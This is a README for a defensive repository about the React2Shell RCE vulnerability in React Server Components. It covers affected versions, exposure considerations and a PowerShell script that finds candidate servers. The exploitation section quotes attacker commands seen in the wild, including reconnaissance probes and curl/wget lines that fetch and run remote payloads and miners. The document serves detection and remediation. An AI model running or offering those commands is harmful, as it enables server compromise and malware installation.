# React2Shell (CVE-2025-55182) – Overview & Detection Guide

## What is React2Shell?

**React2Shell** is the name given to a critical pre-authentication **Remote Code Execution (RCE)** vulnerability in **React Server Components (RSC)**, specifically within the **Flight protocol** used for server-side rendering and server actions.

It is tracked as:

* **CVE-2025-55182** – Core RSC / Flight protocol vulnerability
* **CVE-2025-66478** – Next.js integration (later marked a duplicate of CVE-2025-55182)

The vulnerability allows:

* **Unauthenticated remote code execution**
* Full compromise of backend servers running vulnerable RSC versions
* Widespread exploitation in the wild (e.g., PeerBlight, CowTunnel attacks)

### Vulnerable packages

Per the official React advisory, the following packages are affected in versions: **19.0, 19.1.0, 19.1.1, 19.2.0**:

* `react-server-dom-webpack`
* `react-server-dom-parcel`
* `react-server-dom-turbopack`

Patched versions:

* **19.0.1**, **19.1.2**, **19.2.1**

Frameworks using RSC—including **Next.js App Router**, **React Router RSC**, **Waku**, and others—inherit this vulnerability.

---

## When is a server relevant to React2Shell?

A server is a potential target **only if ALL the following are true**:

### 1. It runs a JavaScript runtime:

* Node.js
* Bun
* Deno
* Or a JS engine in an edge/worker environment

### 2. It hosts or proxies a backend that uses **React Server Components**, usually via:

* Next.js **App Router** (React 19)
* Other frameworks using `react-server-dom-*` or RSC “server actions”

### 3. The application is using **vulnerable RSC packages** or an unpatched version of Next.js.

### NOT affected:

* Pure frontend-only React SPA builds
* Traditional stacks without JS runtimes (IIS/.NET, Java/Tomcat, PHP, etc.)
* Servers running React but **not** RSC/Server Actions

---

## Important considerations

### 1. Updating Node.js does **NOT** fix React2Shell

The vulnerability is **not in Node.js**.
It is in **React Server Components and the Flight protocol**.

Mitigation requires:

* Updating **RSC packages** (`react-server-dom-*`)
* Updating affected frameworks (Next.js, Waku, etc.)
* Rebuilding and redeploying the application

Updating Node.js alone does **nothing**.

---

### 2. Architecture matters — the exposed server might not be the vulnerable one

Typical deployment:

```
Internet → WAF / Load Balancer → Web Server → Internal Node/Next.js Server
```

This means:

* The public web server (IIS, Nginx, NetScaler) may show **no trace** of Node or React
* The actual vulnerable component may be **an internal Node/Next server** or a container behind the reverse proxy

You must map **all backend chains** when assessing exposure.

---

### 3. How to determine if an app is vulnerable

Inside `package.json`, check for:

#### RSC packages:

* `react-server-dom-webpack`
* `react-server-dom-parcel`
* `react-server-dom-turbopack`

Version mapping:

| Version                         | Status         |
| ------------------------------- | -------------- |
| 19.0 / 19.1.0 / 19.1.1 / 19.2.0 | **VULNERABLE** |
| 19.0.1 / 19.1.2 / 19.2.1        | **PATCHED**    |

The same applies to frameworks:

* Next.js versions must be checked against the official patched release tables.
  (Many 15.x and 16.x releases were patched by the React team.)

---

### 4. How exploitation looks in practice

React2Shell exploitation involves maliciously crafted RSC/Flight payloads.
Observed in-the-wild techniques include:

* Pre-attack probes using:

  * `whoami`
  * `hostname`
  * `echo $((41*271))`
  * `echo $((40872*40785))`
  * `ver || id` (OS detection)
* Follow-up malware delivery attempts:

  * `curl http://.../payload.sh | bash`
  * `wget http://.../miner && ./miner`
* Full compromises (e.g., PeerBlight malware family)

This repository does **not** include PoCs—only **detection heuristics**.

---

# Script: `Check-RSCIndicators.ps1`

This script performs **heuristic detection** of servers that *might* be running React Server Components or Next.js App Router workloads.

> ⚠️ **Important:**  
> - It does **not** guarantee that a system is free from vulnerabilities.  
> - Even if the script does not find any indicators, this is **not a confirmation of safety**.  
> - Each application owner is responsible for verifying whether vulnerable components are used in their codebase and taking appropriate remediation steps.

The script is intended to help operations teams **identify candidate servers** for deeper investigation, not to provide a definitive security assessment.

---

## What the script detects (summary)

### ✔ 1. Installed JS runtimes

* Node
* Bun
* Deno
* PM2 (strong indicator of Node-based apps)

### ✔ 2. Active processes

* `node.exe`, `bun.exe`, `deno.exe`, `pm2.exe`
* Parent process mapping
* Command line used to start the process

### ✔ 3. Filesystem indicators

Searches common web directories for:

* `package.json`
* Dependencies:

  * `next`
  * `react-server-dom-*`
  * `waku`
  * `react` / `react-dom`
* RSC-related artifacts:

  * `.next/` build folder
  * `app/` directory (Next.js App Router)
  * `next.config.js/mjs/ts`
* Text occurrences of `"react-server-dom"` anywhere in the app root

Each discovered app is tagged with a **RiskLevel** (“High”, “Medium”, “Needs Review”).

---

### ✔ 4. Next.js-style local ports

Detects listening ports commonly used by dev/prod Next.js servers:

```
3000, 3001, 3002, 3003, 4000, 4001, 8000, 8080
```

### ✔ 5. Outbound connections to other servers on Next-like ports

Helps identify:

* Internal Node/Next services
* Hidden backend servers behind IIS/NetScaler/Nginx

---

## How to use the script

### 1. Download the script

Save it as:

```
Check-RSCIndicators.ps1
```

### 2. Run locally on a server

```powershell
Set-ExecutionPolicy RemoteSigned -Scope Process -Force
.\Check-RSCIndicators.ps1
```

### 3. Specify custom search paths

```powershell
.\Check-RSCIndicators.ps1 -SearchRoots "C:\inetpub","D:\web","E:\apps"
```

### 4. Export results

```powershell
$res = .\Check-RSCIndicators.ps1
$res.FileIndicators | Export-Csv "RSC-Apps-$env:COMPUTERNAME.csv" -NoTypeInformation -Encoding UTF8
```

### 5. Run across multiple servers (example)

```powershell
$servers = @("WEB01","WEB02","APP01")

Invoke-Command -ComputerName $servers -FilePath .\Check-RSCIndicators.ps1 |
  ForEach-Object { $_.FileIndicators } |
  Export-Csv "RSC-Apps-AllServers.csv" -NoTypeInformation -Encoding UTF8
```

---

# Interpretation of results

### If **no** indicators are found:

* The server is likely **not running RSC/Next**,
* But it may still be a **proxy** to a backend that *is* running RSC.
  → Follow the chain (load balancer → backend → containers).

### If indicators **are** found:

* Review the detected packages, versions, and app root
* Ask the development team to confirm:

  * RSC versions (`react-server-dom-*`)
  * Framework versions (Next.js, Waku, etc.)
  * Whether patched versions are deployed
* Perform full vulnerability assessment

